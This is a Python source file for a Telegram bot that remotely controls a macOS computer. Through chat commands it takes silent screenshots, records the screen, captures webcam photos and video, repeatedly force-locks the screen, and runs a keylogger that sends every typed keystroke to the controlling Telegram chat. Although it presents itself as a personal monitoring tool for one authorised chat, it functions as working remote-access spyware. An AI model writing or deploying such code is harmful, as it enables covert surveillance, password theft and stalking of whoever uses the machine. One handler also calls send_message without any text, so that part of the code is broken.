import telebot
import subprocess
import os
import time
from datetime import datetime, timedelta
import threading
import requests

# --- NEW DEPENDENCIES (Install these: pip3 install pynput --user) ---
from pynput import keyboard

# --- Configuration ---
BOT_TOKEN = "your_token_here" # Replace with your actual bot token
AUTHORIZED_CHAT_ID = your_id_here # Replace with your actual authorized chat ID

IMAGESNAP_PATH = "/opt/homebrew/bin/imagesnap" # Adjust if your path is different
FFMPEG_PATH = "/opt/homebrew/bin/ffmpeg"     # Adjust if your path is different
# SCREENCAPTURE_PATH is usually /usr/sbin/screencapture, which is in the default PATH

# --- Bot Initialization ---
bot = telebot.TeleBot(BOT_TOKEN)

# --- Global variables for features ---
# (Existing globals remain the same)
lockdown_active = False
lockdown_repeating_timer = None
lockdown_end_timer = None
LOCKDOWN_INTERVAL = 3

wifi_monitor_active = True
wifi_monitor_timer = None
last_wifi_power_state = "initial_unknown"
wifi_disabled_timestamp = None
last_known_internet_state = "initial_unknown"
WIFI_MONITOR_INTERVAL = 10

keylogger_active = False
key_buffer = []
key_log_timer = None
KEY_LOG_TIMEOUT = 3
keylogger_listener_thread = None
keylogger_listener_object = None

# --- Helper Functions (Existing and New) ---
def show_macos_popup(message_text):
    escaped_message = message_text.replace('"', '\\"')
    applescript_command = f'display dialog "{escaped_message}" with title "Alert" buttons {{"OK"}} default button "OK"'
    try:
        subprocess.run(["osascript", "-e", applescript_command], check=True, capture_output=True)
        return True
    except subprocess.CalledProcessError as e:
        print(f"AppleScript error: {e.stderr.decode()}", flush=True)
        return False
    except Exception as e:
        print(f"Unexpected error in show_macos_popup: {e}", flush=True)
        return False

def take_screenshot_and_send(chat_id):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    screenshot_path = f"/tmp/screenshot_{timestamp}.png"
    try:
        # -S: Capture screen, -x: do not play sounds
        subprocess.run(["screencapture", "-S", "-x", screenshot_path], check=True, capture_output=True)
        with open(screenshot_path, "rb") as photo:
            bot.send_photo(chat_id, photo, caption=f"Desktop screenshot taken at {timestamp}, your_name_here.")
        print(f"Screenshot sent: {screenshot_path}", flush=True)
        return True
    except FileNotFoundError:
        bot.send_message(chat_id, "Error: 'screencapture' command not found. Is this macOS, your_name_here?")
        print("Error: 'screencapture' command not found.", flush=True)
        return False
    except subprocess.CalledProcessError as e:
        bot.send_message(chat_id, f"Error taking screenshot: {e.stderr.decode()}")
        print(f"Error taking screenshot: {e.stderr.decode()}", flush=True)
        return False
    except Exception as e:
        bot.send_message(chat_id, f"An unexpected error occurred: {e}")
        print(f"Unexpected error in screenshot function: {e}", flush=True)
        return False
    finally:
        if os.path.exists(screenshot_path):
            os.remove(screenshot_path)
            print(f"Removed temporary screenshot: {screenshot_path}", flush=True)

# --- NEW: Screen Recording Function ---
def record_screen_and_send(chat_id, duration_seconds):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    raw_video_path = f"/tmp/screenrec_raw_{timestamp}.mov" # screencapture outputs .mov
    final_video_path = f"/tmp/screenrec_final_{timestamp}.mp4"

    # screencapture options:
    # -V <seconds>: Record video for specified duration
    # -x : Do not play sounds
    # -k : Show clicks (optional, remove if not desired)
    # We will not specify a display, so it defaults to the main display.
    # To capture a specific display: screencapture -D <display_id> -V <seconds> ...
    # To capture audio with video: screencapture -V <seconds> -A ... (requires Loopback or similar for system audio)
    # For simplicity, we'll stick to video-only from the main display.

    screencapture_command = ["screencapture", "-V", str(duration_seconds), "-x", "-k", raw_video_path]

    try:
        bot.send_message(chat_id, f"Starting screen recording for {duration_seconds} seconds...")
        print(f"Executing screencapture: {' '.join(screencapture_command)}", flush=True)
        # `screencapture -V` is blocking, so it will run for `duration_seconds`
        capture_process = subprocess.run(screencapture_command, check=True, capture_output=True)
        print(f"Screencapture stdout: {capture_process.stdout.decode()}", flush=True)
        print(f"Screencapture stderr: {capture_process.stderr.decode()}", flush=True)

        if not os.path.exists(raw_video_path) or os.path.getsize(raw_video_path) == 0:
            bot.send_message(chat_id, "Screen recording failed: Raw video file not created or is empty.")
            print(f"Raw video file missing or empty: {raw_video_path}", flush=True)
            return False

        bot.send_message(chat_id, "Screen recording complete. Converting video to MP4...")
        print(f"Converting {raw_video_path} to {final_video_path} using ffmpeg...", flush=True)
        ffmpeg_command = [
            FFMPEG_PATH,
            "-i", raw_video_path,
            "-c:v", "libx264",      # Good quality and compatibility
            "-preset", "ultrafast", # Faster encoding
            "-pix_fmt", "yuv420p",  # Common pixel format
            "-crf", "23",           # Constant Rate Factor (quality, lower is better, 18-28 is typical)
            "-movflags", "+faststart", # Good for streaming/web playback
            final_video_path
        ]
        convert_process = subprocess.run(ffmpeg_command, check=True, capture_output=True)
        print(f"FFmpeg convert stdout: {convert_process.stdout.decode()}", flush=True)
        print(f"FFmpeg convert stderr: {convert_process.stderr.decode()}", flush=True)

        if os.path.exists(final_video_path) and os.path.getsize(final_video_path) > 0:
            with open(final_video_path, "rb") as video_file:
                bot.send_video(chat_id, video_file, caption=f"Screen recording ({duration_seconds}s) from {timestamp}, your_name_here.")
            print(f"Screen recording sent: {final_video_path}", flush=True)
            return True
        else:
            bot.send_message(chat_id, "Video conversion failed or output file is empty.")
            print(f"Final video file missing or empty: {final_video_path}", flush=True)
            return False

    except FileNotFoundError as e:
        if str(e).startswith("[Errno 2] No such file or directory: 'screencapture'"):
            msg = "Error: 'screencapture' command not found. Is this macOS?"
        elif FFMPEG_PATH in str(e):
            msg = f"Error: Command '{FFMPEG_PATH}' not found. Is the path correct and ffmpeg installed?"
        else:
            msg = f"File not found error: {e}"
        bot.send_message(chat_id, msg)
        print(msg, flush=True)
        return False
    except subprocess.CalledProcessError as e:
        error_source = "screencapture" if e.cmd[0] == "screencapture" else "ffmpeg"
        error_details = f"Command: {' '.join(e.cmd)}\nReturn Code: {e.returncode}\n"
        if e.stdout: error_details += f"STDOUT: {e.stdout.decode(errors='ignore')}\n"
        if e.stderr: error_details += f"STDERR: {e.stderr.decode(errors='ignore')}"
        bot.send_message(chat_id, f"Error during {error_source} execution. Check bot logs.")
        print(f"Error during {error_source}: {error_details}", flush=True)
        return False
    except Exception as e:
        bot.send_message(chat_id, f"An unexpected error occurred during screen recording: {e}")
        print(f"Unexpected error in record_screen_and_send: {e}", flush=True)
        import traceback
        traceback.print_exc()
        return False
    finally:
        if os.path.exists(raw_video_path):
            os.remove(raw_video_path)
            print(f"Removed temporary raw video: {raw_video_path}", flush=True)
        if os.path.exists(final_video_path):
            os.remove(final_video_path)
            print(f"Removed temporary final video: {final_video_path}", flush=True)


def lock_macos_screen():
    # ... (implementation as before) ...
    try:
        applescript_command = 'tell application "System Events" to keystroke "q" using {control down, command down}'
        subprocess.run(["osascript", "-e", applescript_command], check=True)
        print("Screen locked successfully using AppleScript.", flush=True)
        return True
    except subprocess.CalledProcessError as e:
        print(f"Error locking screen with AppleScript: {e.stderr.decode()}", flush=True)
        return False
    except Exception as e:
        print(f"Unexpected error in lock_macos_screen: {e}", flush=True)
        return False

def start_repeating_lock(chat_id):
    # ... (implementation as before) ...
    global lockdown_active, lockdown_repeating_timer
    if lockdown_active:
        print("Lockdown already active.", flush=True)
        return
    lockdown_active = True
    bot.send_message(chat_id, "Lockdown sequence initiated. Screen will re-lock.")
    def repeating_lock_task():
        if lockdown_active:
            print(f"Executing timed lock (active={lockdown_active}).", flush=True)
            lock_macos_screen()
            global lockdown_repeating_timer
            if lockdown_repeating_timer: lockdown_repeating_timer.cancel()
            lockdown_repeating_timer = threading.Timer(LOCKDOWN_INTERVAL, repeating_lock_task)
            lockdown_repeating_timer.start()
        else:
            print("Lockdown became inactive. Stopping repeating lock task.", flush=True)
            if lockdown_repeating_timer:
                lockdown_repeating_timer.cancel()
    lock_macos_screen()
    if lockdown_repeating_timer: lockdown_repeating_timer.cancel()
    lockdown_repeating_timer = threading.Timer(LOCKDOWN_INTERVAL, repeating_lock_task)
    lockdown_repeating_timer.start()

def stop_repeating_lock(chat_id=None):
    # ... (implementation as before) ...
    global lockdown_active, lockdown_repeating_timer, lockdown_end_timer
    if not lockdown_active:
        if chat_id: bot.send_message(chat_id, "Lockdown is not currently active, your_name_here.")
        return
    lockdown_active = False
    if lockdown_repeating_timer:
        lockdown_repeating_timer.cancel()
        lockdown_repeating_timer = None
    if lockdown_end_timer:
        lockdown_end_timer.cancel()
        lockdown_end_timer = None
    print("Lockdown stopped.", flush=True)
    if chat_id: bot.send_message(chat_id, "Lockdown cancelled, your_name_here.")

def get_wifi_status():
    # ... (implementation as before) ...
    try:
        result = subprocess.run(["networksetup", "-getairportpower", "en0"], capture_output=True, text=True, check=True)
        output = result.stdout.strip()
        if "Wi-Fi Power (en0): On" in output: return "on"
        elif "Wi-Fi Power (en0): Off" in output: return "off"
        else:
            print(f"Unexpected Wi-Fi status output: {output}", flush=True)
            return "unknown"
    except FileNotFoundError:
        print("Error: 'networksetup' command not found.", flush=True)
        return "error"
    except subprocess.CalledProcessError as e:
        if "not a Wi-Fi interface" in e.stderr.strip().lower():
             print(f"Wi-Fi check error: en0 is not a Wi-Fi interface. Output: {e.stderr.strip()}", flush=True)
        else:
            print(f"Error running networksetup: {e.stderr.strip()}", flush=True)
        return "error"
    except Exception as e:
        print(f"Unexpected error checking Wi-Fi: {e}", flush=True)
        return "error"

def perform_connect_test():
    # ... (implementation as before) ...
    try:
        result = subprocess.run(["ping", "-c", "1", "-W", "5000", "1.1.1.1"], capture_output=True, text=True, check=False)
        if result.returncode == 0:
            return True, "Ping to 1.1.1.1 successful."
        else:
            return False, f"Ping to 1.1.1.1 failed. Output:\n{result.stdout.strip()}\n{result.stderr.strip()}"
    except FileNotFoundError:
        return False, "Error: 'ping' command not found."
    except Exception as e:
        return False, f"Unexpected error during connect test: {e}"

def wifi_monitoring_task(chat_id_param):
    # ... (implementation as before) ...
    global wifi_monitor_active, wifi_monitor_timer, last_wifi_power_state, wifi_disabled_timestamp
    global last_known_internet_state
    if not wifi_monitor_active:
        print("Wi-Fi monitoring inactive. Stopping task.", flush=True)
        if wifi_monitor_timer: wifi_monitor_timer.cancel()
        return
    current_wifi_power = get_wifi_status()
    if last_known_internet_state == "initial_unknown":
        print(f"Initial Wi-Fi radio power: {current_wifi_power}", flush=True)
        initial_message_parts = [f"Wi-Fi & Internet monitoring started, your_name_here."]
        initial_message_parts.append(f"Radio: {current_wifi_power.upper()}")
        if current_wifi_power == "on":
            is_connected, _ = perform_connect_test()
            if is_connected:
                last_known_internet_state = "connected"
                initial_message_parts.append("Internet: CONNECTED")
            else:
                last_known_internet_state = "disconnected"
                initial_message_parts.append("Internet: DISCONNECTED")
        elif current_wifi_power == "off":
            last_known_internet_state = "disconnected"
            wifi_disabled_timestamp = datetime.now()
        else:
            last_known_internet_state = "disconnected"
        last_wifi_power_state = current_wifi_power
        try:
            bot.send_message(chat_id_param, " ".join(initial_message_parts) + ".")
        except Exception as e:
            print(f"Error sending initial Wi-Fi/Internet status message: {e}", flush=True)
    else:
        if current_wifi_power == "off" and last_wifi_power_state == "on":
            print(f"Wi-Fi radio turned OFF (was {last_wifi_power_state}). Internet considered DISCONNECTED.", flush=True)
            wifi_disabled_timestamp = datetime.now()
            if last_known_internet_state == "connected":
                try:
                    bot.send_message(chat_id_param, "⚠️ WARNING: Wi-Fi radio has been turned OFF, your_name_here. Internet is now disconnected.")
                except Exception as e:
                    print(f"Error sending Wi-Fi OFF message: {e}", flush=True)
            last_known_internet_state = "disconnected"
        elif current_wifi_power == "on":
            is_connected_now, connect_msg = perform_connect_test()
            if is_connected_now:
                if last_known_internet_state == "disconnected":
                    print(f"Internet connectivity test PASSED: {connect_msg}", flush=True)
                    online_message = "✅ Internet is back ONLINE, your_name_here! (Connection test passed)"
                    if wifi_disabled_timestamp:
                        online_message += f"\nWi-Fi radio was previously off since: {wifi_disabled_timestamp.strftime('%Y-%m-%d %H:%M:%S')}"
                    try:
                        bot.send_message(chat_id_param, online_message)
                    except Exception as e:
                        print(f"Error sending Internet back ONLINE message: {e}", flush=True)
                    wifi_disabled_timestamp = None
                last_known_internet_state = "connected"
            else:
                print(f"Wi-Fi radio is ON, but internet connectivity test FAILED: {connect_msg}", flush=True)
                if last_known_internet_state == "connected":
                    try:
                        bot.send_message(chat_id_param, "⚠️ WARNING: Internet connection LOST while Wi-Fi radio is ON, your_name_here.")
                    except Exception as e:
                        print(f"Error sending Internet LOST (Wi-Fi ON) message: {e}", flush=True)
                elif last_wifi_power_state != "on":
                    try:
                        bot.send_message(chat_id_param, f"ℹ️ Wi-Fi radio is ON, but internet is not yet active, your_name_here. Will keep checking.")
                    except Exception as e:
                        print(f"Error sending Wi-Fi ON / internet pending message: {e}", flush=True)
                last_known_internet_state = "disconnected"
        elif current_wifi_power in ["error", "unknown"]:
             print(f"Wi-Fi radio status check returned: {current_wifi_power}. Last valid power state was {last_wifi_power_state}. Internet state remains {last_known_internet_state}.", flush=True)
        if current_wifi_power in ["on", "off"]:
            last_wifi_power_state = current_wifi_power
    if wifi_monitor_active:
        if wifi_monitor_timer:
            wifi_monitor_timer.cancel()
        wifi_monitor_timer = threading.Timer(WIFI_MONITOR_INTERVAL, wifi_monitoring_task, args=(chat_id_param,))
        wifi_monitor_timer.start()

def take_webcam_photo_and_send(chat_id):
    # ... (implementation as before) ...
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    photo_path = f"/tmp/webcam_photo_{timestamp}.jpg"
    command = [IMAGESNAP_PATH, "-w", "1", photo_path]
    try:
        bot.send_message(chat_id, "Capturing photo from webcam...")
        subprocess.run(command, check=True, capture_output=True)
        if os.path.exists(photo_path):
            with open(photo_path, "rb") as p:
                bot.send_photo(chat_id, p, caption=f"Webcam photo taken at {timestamp}, your_name_here.")
            print(f"Webcam photo sent: {photo_path}", flush=True)
            return True
        else:
            bot.send_message(chat_id, "Failed to capture photo. File not found after command execution.")
            print(f"Webcam photo not found at {photo_path} after imagesnap command.", flush=True)
            return False
    except FileNotFoundError:
        bot.send_message(chat_id, f"Error: Command '{IMAGESNAP_PATH}' not found. Is the path correct and imagesnap installed?")
        print(f"Error: Command '{IMAGESNAP_PATH}' not found.", flush=True)
        return False
    except subprocess.CalledProcessError as e:
        error_message = e.stderr.decode() if e.stderr else str(e)
        bot.send_message(chat_id, f"Error taking webcam photo: {error_message}")
        print(f"Error taking webcam photo: {error_message}", flush=True)
        return False
    except Exception as e:
        bot.send_message(chat_id, f"An unexpected error occurred while taking webcam photo: {e}")
        print(f"Unexpected error in take_webcam_photo_and_send: {e}", flush=True)
        return False
    finally:
        if os.path.exists(photo_path):
            os.remove(photo_path)
            print(f"Removed temporary webcam photo: {photo_path}", flush=True)

def record_webcam_video_and_send(chat_id, duration_seconds):
    # ... (implementation as before) ...
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    video_path = f"/tmp/webcam_video_{timestamp}.mp4"
    command = [
        FFMPEG_PATH,
        "-f", "avfoundation", "-framerate", "30", "-i", "0",
        "-t", str(duration_seconds),
        "-c:v", "libx264", "-preset", "ultrafast", "-pix_fmt", "yuv420p",
        video_path
    ]
    try:
        bot.send_message(chat_id, f"Recording video from webcam for {duration_seconds} seconds...")
        process = subprocess.run(command, check=True, capture_output=True)
        print(f"FFmpeg stdout: {process.stdout.decode()}", flush=True)
        print(f"FFmpeg stderr: {process.stderr.decode()}", flush=True)
        if os.path.exists(video_path) and os.path.getsize(video_path) > 0:
            with open(video_path, "rb") as v:
                bot.send_video(chat_id, v, caption=f"Webcam video ({duration_seconds}s) recorded at {timestamp}, your_name_here.")
            print(f"Webcam video sent: {video_path}", flush=True)
            return True
        else:
            bot.send_message(chat_id, "Failed to record video. Output file not found or is empty after command execution.")
            print(f"Webcam video not found or empty at {video_path} after ffmpeg command.", flush=True)
            return False
    except FileNotFoundError:
        bot.send_message(chat_id, f"Error: Command '{FFMPEG_PATH}' not found. Is the path correct and ffmpeg installed?")
        print(f"Error: Command '{FFMPEG_PATH}' not found.", flush=True)
        return False
    except subprocess.CalledProcessError as e:
        error_message = f"FFmpeg Error Output:\nSTDERR: {e.stderr.decode() if e.stderr else 'N/A'}\nSTDOUT: {e.stdout.decode() if e.stdout else 'N/A'}"
        bot.send_message(chat_id, f"Error recording webcam video. Check bot logs for FFmpeg output.")
        print(f"Error recording webcam video: {error_message}", flush=True)
        return False
    except Exception as e:
        bot.send_message(chat_id, f"An unexpected error occurred while recording webcam video: {e}")
        print(f"Unexpected error in record_webcam_video_and_send: {e}", flush=True)
        import traceback
        traceback.print_exc()
        return False
    finally:
        if os.path.exists(video_path):
            os.remove(video_path)
            print(f"Removed temporary webcam video: {video_path}", flush=True)

# --- Keylogger Functions ---
def send_key_log():
    # ... (implementation as before) ...
    global key_buffer, key_log_timer
    if key_log_timer:
        key_log_timer.cancel()
        key_log_timer = None
    if key_buffer:
        log_message = "".join(key_buffer)
        try:
            max_len = 4090
            for i in range(0, len(log_message), max_len):
                chunk = log_message[i:i+max_len]
                bot.send_message(AUTHORIZED_CHAT_ID, f"Key Log:\n{chunk}")
            print(f"Sent key log: {len(log_message)} chars", flush=True)
        except Exception as e:
            print(f"Error sending key log: {e}", flush=True)
        key_buffer = []

def on_press(key):
    # ... (implementation as before) ...
    global key_buffer, key_log_timer, keylogger_active
    if not keylogger_active:
        return False

    if key_log_timer:
        key_log_timer.cancel()

    try:
        key_buffer.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space: key_buffer.append(' ')
        elif key == keyboard.Key.enter: key_buffer.append('\n')
        elif key == keyboard.Key.tab: key_buffer.append('\t')
        else:
            key_name = str(key).replace("Key.", "")
            if key_name not in ['shift', 'ctrl', 'alt', 'cmd', 'shift_r', 'ctrl_r', 'alt_r', 'cmd_r', 'alt_gr', 'caps_lock']:
                 key_buffer.append(f'[{key_name}]')

    key_log_timer = threading.Timer(KEY_LOG_TIMEOUT, send_key_log)
    key_log_timer.start()

def start_keylogger_listener():
    # ... (implementation as before) ...
    global keylogger_listener_object
    try:
        print("Attempting to start keylogger listener. Ensure Accessibility permissions are granted.", flush=True)
        keylogger_listener_object = keyboard.Listener(on_press=on_press)
        keylogger_listener_object.start()
        print("Keylogger listener started successfully.", flush=True)
        return True
    except Exception as e:
        print(f"Error starting pynput listener: {e}", flush=True)
        bot.send_message(AUTHORIZED_CHAT_ID, f"Error starting keylogger: {e}. Check Accessibility permissions for Python/Terminal.")
        return False

def stop_keylogger_listener():
    # ... (implementation as before) ...
    global keylogger_listener_object, keylogger_active
    keylogger_active = False
    if keylogger_listener_object:
        print("Attempting to stop keylogger listener...", flush=True)
        keylogger_listener_object.stop()
        keylogger_listener_object = None
        print("Keylogger listener should be stopped.", flush=True)
    send_key_log()

# --- Message Handlers (Existing and New) ---
@bot.message_handler(commands=["start"])
def handle_start(message):
    if message.chat.id == AUTHORIZED_CHAT_ID:
        bot.reply_to(message, f"Hello, your_name_here! I'm ready. Your chat ID is {message.chat.id}.")
        prereq_info = (
            "For /photo & /video: 'imagesnap' & 'ffmpeg' needed. Grant Camera permissions.\n"
            "For /startkeylogger: 'pynput' needed. Grant Accessibility permissions.\n"
            "For /screenrecord: Grant Screen Recording permissions."
            "\nAll permissions are granted to Python/Terminal in System Settings > Privacy & Security."
        )
        bot.send_message(message.chat.id)
    else:
        print(f"Unauthorized access with /start from Chat ID: {message.chat.id}.", flush=True)

@bot.message_handler(commands=["help"])
def handle_help(message):
    if message.chat.id == AUTHORIZED_CHAT_ID:
        help_text = """
Available commands, your_name_here:
/start - Welcome message & user ID.
/help - This help message.
/popup <text> - Shows a macOS popup.
/ss - Takes a desktop screenshot.
/screenrecord <seconds> - Records the screen for a duration and sends the video.
/lock - Locks the macOS screen.
/photo - Takes a photo from the webcam.
/video <seconds> - Records a video from the webcam.
/startkeylogger - Starts the keylogger.
/stopkeylogger - Stops the keylogger and sends final log.
/test - Performs an internet connection test.
/lockdown [seconds] - Repeatedly locks screen.
/cancellockdown - Cancels lockdown.
"""
        try:
            bot.reply_to(message, help_text)
        except Exception as e:
            print(f"Error sending help message: {e}", flush=True)
    else:
        print(f"Unauthorized access with /help from Chat ID: {message.chat.id}.", flush=True)

@bot.message_handler(commands=["popup"])
def handle_popup(message):
    if message.chat.id != AUTHORIZED_CHAT_ID: return
    popup_text = message.text.replace("/popup", "", 1).strip()
    if popup_text:
        if show_macos_popup(popup_text): bot.reply_to(message, "Popup displayed!")
        else: bot.reply_to(message, "Failed to display popup.")
    else: bot.reply_to(message, "Usage: /popup <text>")

@bot.message_handler(commands=["ss"])
def handle_screenshot(message):
    if message.chat.id != AUTHORIZED_CHAT_ID: return
    if not take_screenshot_and_send(message.chat.id):
        print("handle_screenshot: reported failure.", flush=True)

# --- NEW: Screen Record Command Handler ---
@bot.message_handler(commands=["screenrecord"])
def handle_screen_record(message):
    if message.chat.id != AUTHORIZED_CHAT_ID:
        print(f"Unauthorized /screenrecord from {message.chat.id}", flush=True)
        return

    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Usage: /screenrecord <seconds>\nExample: /screenrecord 15")
        return

    try:
        duration = int(args[1])
        # Set a reasonable min/max duration, e.g., 5 seconds to 5 minutes (300 seconds)
        if not (5 <= duration <= 300):
            bot.reply_to(message, "Duration must be between 5 and 300 seconds.")
            return
        record_screen_and_send(message.chat.id, duration)
    except ValueError:
        bot.reply_to(message, "Invalid duration. Must be a number. Usage: /screenrecord <seconds>")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred with the screenrecord command: {e}")
        print(f"Error in handle_screen_record: {e}", flush=True)

@bot.message_handler(commands=["lock"])
def handle_lock_screen(message):
    # ... (implementation as before) ...
    if message.chat.id != AUTHORIZED_CHAT_ID: return
    bot.send_message(message.chat.id, "Attempting to lock screen...")
    if lock_macos_screen(): bot.send_message(message.chat.id, "Screen locked.")
    else: bot.send_message(message.chat.id, "Failed to lock screen.")

@bot.message_handler(commands=["photo"])
def handle_webcam_photo(message):
    # ... (implementation as before) ...
    if message.chat.id != AUTHORIZED_CHAT_ID: return
    take_webcam_photo_and_send(message.chat.id)

@bot.message_handler(commands=["video"])
def handle_webcam_video(message):
    # ... (implementation as before) ...
    if message.chat.id != AUTHORIZED_CHAT_ID: return
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "Usage: /video <seconds>\nExample: /video 10")
        return
    try:
        duration = int(args[1])
        if not (1 <= duration <= 300) :
            bot.reply_to(message, "Duration must be between 1 and 300 seconds.")
            return
        record_webcam_video_and_send(message.chat.id, duration)
    except ValueError: bot.reply_to(message, "Invalid duration. Must be a number. Usage: /video <seconds>")
    except Exception as e: bot.send_message(message.chat.id, f"An error occurred with the video command: {e}")

@bot.message_handler(commands=["test"])
def handle_connect_test(message):
    # ... (implementation as before) ...
    if message.chat.id != AUTHORIZED_CHAT_ID: return
    bot.send_message(message.chat.id, "Performing internet connection test...")
    success, result_message = perform_connect_test()
    reply = f"✅ Test successful!\n{result_message}" if success else f"❌ Test failed.\n{result_message}"
    bot.send_message(message.chat.id, reply)

@bot.message_handler(commands=["lockdown"])
def handle_lockdown(message):
    # ... (implementation as before) ...
    if message.chat.id != AUTHORIZED_CHAT_ID: return
    global lockdown_end_timer
    if lockdown_active:
        bot.send_message(message.chat.id, "Lockdown already active.")
        return
    args = message.text.split()
    duration_seconds = None
    if len(args) > 1:
        try:
            duration_seconds = int(args[1])
            if duration_seconds <= 0:
                bot.reply_to(message, "Duration must be a positive number of seconds.")
                return
        except ValueError:
            bot.reply_to(message, "Invalid duration. Usage: /lockdown [seconds]")
            return
    if duration_seconds:
        bot.send_message(message.chat.id, f"Starting lockdown for {duration_seconds} seconds.")
        start_repeating_lock(message.chat.id)
        if lockdown_end_timer: lockdown_end_timer.cancel()
        lockdown_end_timer = threading.Timer(duration_seconds, stop_repeating_lock, args=(message.chat.id,))
        lockdown_end_timer.start()
    else:
        bot.send_message(message.chat.id, "Starting indefinite lockdown.")
        start_repeating_lock(message.chat.id)
        if lockdown_end_timer:
            lockdown_end_timer.cancel()
            lockdown_end_timer = None

@bot.message_handler(commands=["cancellockdown"])
def handle_cancel_lockdown(message):
    # ... (implementation as before) ...
    if message.chat.id != AUTHORIZED_CHAT_ID: return
    stop_repeating_lock(message.chat.id)


# --- Keylogger Command Handlers ---
@bot.message_handler(commands=["startkeylogger"])
def handle_start_keylogger(message):
    # ... (implementation as before) ...
    if message.chat.id != AUTHORIZED_CHAT_ID:
        print(f"Unauthorized /startkeylogger from {message.chat.id}", flush=True)
        return
    global keylogger_active
    if keylogger_active:
        bot.send_message(message.chat.id, "Keylogger is already active, your_name_here.")
        return

    keylogger_active = True
    key_buffer.clear()
    if start_keylogger_listener():
        bot.send_message(message.chat.id, "Keylogger started, your_name_here. Keystrokes will be logged. Ensure Accessibility permissions are granted to Python/Terminal.")
    else:
        keylogger_active = False
        bot.send_message(message.chat.id, "Failed to start keylogger. Check logs and permissions.")


@bot.message_handler(commands=["stopkeylogger"])
def handle_stop_keylogger(message):
    # ... (implementation as before) ...
    if message.chat.id != AUTHORIZED_CHAT_ID:
        print(f"Unauthorized /stopkeylogger from {message.chat.id}", flush=True)
        return
    global keylogger_active
    if not keylogger_active:
        bot.send_message(message.chat.id, "Keylogger is not currently active, your_name_here.")
        return

    stop_keylogger_listener()
    bot.send_message(message.chat.id, "Keylogger stopped, your_name_here. Final log (if any) sent.")


# --- Start Bot Polling ---
if __name__ == "__main__":
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("CRITICAL: BOT_TOKEN is not set or is a placeholder. Please replace it. Exiting.", flush=True)
        exit(1)
    if not AUTHORIZED_CHAT_ID or AUTHORIZED_CHAT_ID == 0:
        print("CRITICAL: AUTHORIZED_CHAT_ID is not set or is a placeholder. Please set it. Exiting.", flush=True)
        exit(1)
    if not IMAGESNAP_PATH or not FFMPEG_PATH:
        print("CRITICAL: IMAGESNAP_PATH or FFMPEG_PATH is not set. Please check these paths. Exiting.", flush=True)
        exit(1)

    print("Telegram bot starting...", flush=True)
    print(f"INFO: Using imagesnap from: {IMAGESNAP_PATH}", flush=True)
    print(f"INFO: Using ffmpeg from: {FFMPEG_PATH}", flush=True)
    print("INFO: Keylogger requires 'pynput'. Install with: pip3 install pynput --user", flush=True)
    print("      Grant Accessibility, Camera, and Screen Recording permissions as needed.", flush=True)

    if AUTHORIZED_CHAT_ID:
        print(f"Wi-Fi & Internet monitoring will start for chat ID {AUTHORIZED_CHAT_ID} shortly.", flush=True)
        initial_wifi_monitor_timer = threading.Timer(5.0, wifi_monitoring_task, args=(AUTHORIZED_CHAT_ID,))
        initial_wifi_monitor_timer.start()

    while True:
        try:
            print(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Bot polling started...", flush=True)
            bot.polling(none_stop=True, interval=3, timeout=20)
        except requests.exceptions.ConnectionError as e:
            print(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Bot polling connection error: {e}. Retrying in 10 seconds...", flush=True)
            time.sleep(10)
        except Exception as e:
            print(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Bot polling encountered an unhandled error: {e}", flush=True)
            import traceback
            traceback.print_exc()
            print("Retrying in 10 seconds...", flush=True)
            time.sleep(10)
